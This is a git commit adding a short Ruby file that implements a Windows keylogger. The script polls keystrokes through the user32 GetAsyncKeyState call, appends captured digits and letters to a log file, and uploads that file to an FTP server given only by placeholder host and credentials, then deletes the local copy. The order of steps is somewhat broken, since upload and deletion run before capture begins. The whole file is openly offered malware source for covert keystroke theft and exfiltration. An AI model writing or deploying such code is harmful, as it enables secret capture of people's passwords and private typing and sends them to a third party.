a037ebc6289a7c97dbf28396e0dd597b33a766c2
Luka Miletic <112261868+mileticluka1@users.noreply.github.com>
2022-10-28 11:19:42 -0700

    Add files via upload

---
+++ main.rb
@@ -0,0 +1,43 @@
+#!usr/bin/ruby
+
+require 'net/ftp'
+require 'open-uri'
+require 'win32api'
+ 
+Net::FTP.open('ftp server', 'ftp username', 'ftp password') do |ftp|
+  ftp.passive = true
+  ftp.putbinaryfile("log.txt")
+end
+
+def reseter
+  File.delete("log.txt")
+end
+
+reseter
+
+def savefile(filename,text)
+files = File.open(filename,'a')
+files.puts text+"\n"
+end
+ 
+def capturar
+ 
+nave = Win32API.new("user32","GetAsyncKeyState",["i"],"i")
+ 
+while 1
+ 
+for num1 in (0x30..0x39)
+if nave.call(num1) & 0x01 == 1 
+savefile("log.txt",num1.chr())
+end
+end
+ 
+for num2 in (0x41..0x5A) #letters
+if nave.call(num2) & 0x01 == 1 
+savefile("log.txt",num2.chr())
+end
+end
+end
+end
+ 
+capturar()
